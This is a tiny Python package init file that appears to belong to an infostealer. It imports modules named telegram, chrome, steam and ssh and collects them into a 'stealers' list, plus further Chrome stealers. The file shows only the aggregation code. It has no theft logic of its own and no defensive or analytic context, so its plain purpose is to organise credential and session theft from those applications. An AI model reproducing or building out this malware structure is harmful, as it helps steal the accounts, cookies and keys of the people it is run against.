from . import telegram
from . import chrome
from . import steam
from . import ssh

stealers = [
	telegram,
	steam,
	ssh,
]
stealers += chrome.stealers